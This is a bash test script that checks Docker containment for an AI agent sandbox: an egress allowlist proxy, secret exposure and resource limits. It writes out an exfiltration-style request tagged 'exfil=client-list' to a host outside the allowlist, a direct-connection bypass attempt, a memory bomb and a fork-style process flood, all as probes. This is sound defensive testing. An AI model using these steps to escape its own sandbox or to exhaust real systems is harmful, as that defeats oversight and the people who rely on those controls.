#!/usr/bin/env bash
# Containment primitives check for the Agent Rush plan. Creates and removes its own
# network and containers (names prefixed sbxchk-). Output: run.log next to this file.
set -u
cd "$(dirname "$0")"
N=sbxchk-int; P=sbxchk-proxy; S=sbxchk-task
cleanup(){ docker rm -f $P $S >/dev/null 2>&1; docker network rm $N >/dev/null 2>&1; }
cleanup
docker network create --internal $N >/dev/null
docker run -d --name $P --network bridge -e ALLOW=example.com -v "$PWD/egress-proxy.js:/p.js:ro" node:20-alpine node /p.js >/dev/null
docker network connect $N $P
sleep 2
echo "== 1. allowed host through proxy"
docker run --rm --name $S --network $N --read-only --cap-drop ALL --security-opt no-new-privileges \
  --memory 256m --pids-limit 64 -e https_proxy=http://$P:3128 -e http_proxy=http://$P:3128 \
  -v "$PWD/probe.js:/probe.js:ro" -e PROXY=$P:3128 node:20-alpine node /probe.js https://example.com/; echo exit=$?
echo "== 2. host outside allowlist through proxy (injection target)"
docker run --rm --network $N --read-only --cap-drop ALL --memory 256m --pids-limit 64 \
  -v "$PWD/probe.js:/probe.js:ro" -e PROXY=$P:3128 node:20-alpine node /probe.js "https://httpbin.org/anything?exfil=client-list"; echo exit=$?
echo "== 3. direct connection without proxy (bypass attempt)"
docker run --rm --network $N --read-only --cap-drop ALL --memory 256m node:20-alpine \
  sh -c 'wget -q -T 5 -O - http://1.1.1.1 2>&1 | head -2; nslookup example.com 2>&1 | tail -1'
echo "== 4. secrets visible inside sandbox env (expect none)"
docker run --rm --network $N node:20-alpine sh -c 'env | grep -i -E "key|token|secret|pass" || echo "no secret-like variables"'
echo "== 5. runaway job: 10 s wall-clock limit"
start=$(date +%s)
docker run -d --name $S --network $N --memory 128m --pids-limit 32 node:20-alpine sh -c 'while :; do :; done' >/dev/null
sleep 10; docker kill $S >/dev/null; docker rm -f $S >/dev/null
echo "runaway container killed and removed after $(( $(date +%s) - start )) s; still present: $(docker ps -a --filter name=$S -q | wc -l)"
echo "== 6. memory bomb: 128 MB limit"
docker run --rm --network $N --memory 128m --memory-swap 128m node:20-alpine node -e 'const a=[];for(;;)a.push(Buffer.alloc(16*1024*1024,1))' >/dev/null 2>&1; echo "exit=$? (137 = OOM-killed)"
echo "== 7. fork bomb: pids limit 32"
docker run --rm --network $N --pids-limit 32 node:20-alpine sh -c 'for i in $(seq 1 200); do sleep 30 & done 2>&1 | tail -1; echo "procs=$(ls /proc | grep -c "^[0-9]")"'
echo "== proxy log"
docker logs $P 2>&1
cleanup
echo "== leftovers: $(docker ps -a --filter name=sbxchk- -q | wc -l) containers, $(docker network ls --filter name=sbxchk- -q | wc -l) networks"
